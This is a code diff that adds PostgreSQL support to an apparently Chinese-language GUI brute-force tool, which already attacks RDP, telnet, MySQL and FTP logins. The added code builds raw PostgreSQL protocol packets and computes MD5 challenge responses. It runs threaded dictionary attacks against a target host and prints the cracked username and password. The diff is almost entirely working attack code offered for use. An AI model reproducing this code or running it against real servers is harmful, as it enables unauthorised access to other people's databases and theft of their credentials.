@@ -37,6 +37,8 @@ def change_cbox(event, type, ports):
         ports.set(3389)
     elif type == 'telnet':
         ports.set(23)
+    elif type == 'postgresql':
+        ports.set(5432)
     else:
         return
 
@@ -72,6 +74,17 @@ def crack_port(type, ipaddrs, ports, threads, name, filename, btn_crack, crack_r
         crack_result.delete('0.0', END)
         for i in range(threads):
             t = threading.Thread(target=crack_mysql, args=(ipaddrs, ports, name, q_pwds, crack_result, pbar_crack))
+            t.start()
+    elif type == 'postgresql':
+        q_pwds = get_dict(filename)
+        _crack_flag.set()
+        _crack_running.set()
+        pbar_crack['maximum'] = q_pwds.qsize()
+        _crack_len = 0
+        btn_crack['state'] = DISABLED
+        crack_result.delete('0.0', END)
+        for i in range(threads):
+            t = threading.Thread(target=crack_postgresql, args=(ipaddrs, ports, name, q_pwds, crack_result, pbar_crack))
             t.start()
     elif type == 'telnet':
         q_pwds = get_dict(filename)
@@ -273,6 +286,54 @@ def crack_telnet(ipaddrs, port, name, pwd, crack_result, pbar_crack):
                     pbar_crack['value'] = _crack_len
                     _crack_lock.release()
 
+def crack_postgresql(ipaddrs, port, name, pwd, crack_result, pbar_crack):
+    while _crack_running.isSet():
+        while not pwd.empty():
+            try:
+                _crack_flag.wait()
+                temp_pwd = pwd.get().replace('\n', '')
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.connect((ipaddrs, int(port)))
+                packet_length = len(name) + 7 + len(
+                    b'\x03user  database postgres application_name psql client_encoding UTF8  ')
+                p = b'%c%c%c%c%c\x03%c%cuser%c%s%cdatabase%cpostgres%capplication_name%cpsql%cclient_encoding%cUTF8%c%c' % (
+                    0, 0, 0, packet_length, 0, 0, 0, 0, name.encode(), 0, 0, 0, 0, 0, 0, 0, 0)
+                sock.send(p)
+                packet = sock.recv(1024)
+                psql_salt = []
+                if packet[0:1] == b'R':
+                    a = str([packet[4:5].decode()])
+                    b = int(a[4:6], 16)
+                    authentication_type = str([packet[8:9].decode()])
+                    c = int(authentication_type[4:6], 16)
+                    if c == 5: psql_salt = packet[9:]  # .decode()
+                else:
+                    return 3
+                buf = []
+                salt = psql_salt
+                lmd5 = make_response(buf, name, temp_pwd, salt)
+                packet_length1 = len(lmd5) + 5 + len('p')
+                pp = b'p%c%c%c%c%s%c' % (0, 0, 0, packet_length1 - 1, lmd5.encode(), 0)
+                sock.send(pp)
+                packet1 = sock.recv(1024)
+                if packet1[0:1] == b'R':
+                    result = '[*]INFO：爆破成功' + '>' * 20 + '用户名为：' + name + '  ' + '密码为：' + temp_pwd
+                    crack_result.insert(END, result + '\n')
+                    return
+            except Exception as e:
+                print(e)
+                pass
+            finally:
+                if _crack_lock.acquire():
+                    global _crack_len
+                    _crack_len = _crack_len + 1
+                    pbar_crack['value'] = _crack_len
+                    _crack_lock.release()
+
+def make_response(buf, username, password, salt):
+    pu = hashlib.md5(password.encode() + username.encode()).hexdigest()
+    buf = hashlib.md5(pu.encode() + salt).hexdigest()
+    return 'md5' + buf
 
 def crack_ftp(ipaddrs, port, name, pwd, crack_result, pbar_crack):
     ftp = FTP()
